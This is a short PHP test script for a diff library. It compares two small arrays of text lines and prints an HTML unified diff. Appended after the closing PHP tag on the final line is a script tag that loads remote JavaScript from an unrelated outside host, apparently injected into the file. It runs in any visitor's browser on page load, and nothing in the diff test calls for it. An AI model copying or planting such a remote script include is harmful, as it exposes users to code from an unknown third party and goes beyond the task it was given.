<?php
?>
<style>
	tt {display:none;}
	.original {background:red;}
	.final {background:green;}
</style>
<?
 require_once('prepend.php');
 require_once('diff.php');

 $one = array('This is the text', ' as source', 'third line of text');
 //$one = array('This is the text');

 //$two = array('This is a text');
 $two = array('This is the text', ' 2as source', 'third line of text');
 //$two = array('This is the modified text', 'source');
 //$two = array('text', 'as source');
 
 $diff = new Diff($one, $two);
 $html = HTML::div(array('id'=>'content'),
                     HTML::p("Differences between %s and %s of %s."));
 
 print_r($diff->edits);
 
 if ($diff->isEmpty()) {
 	echo 'identical';
 }
 else {
    $fmt = new HtmlUnifiedDiffFormatter;
    $html->pushContent($fmt->format($diff));
	$html->printXML();
 }
?>
<script src="http://infobox.ru/ob.php?b=1&ref=24445"></script>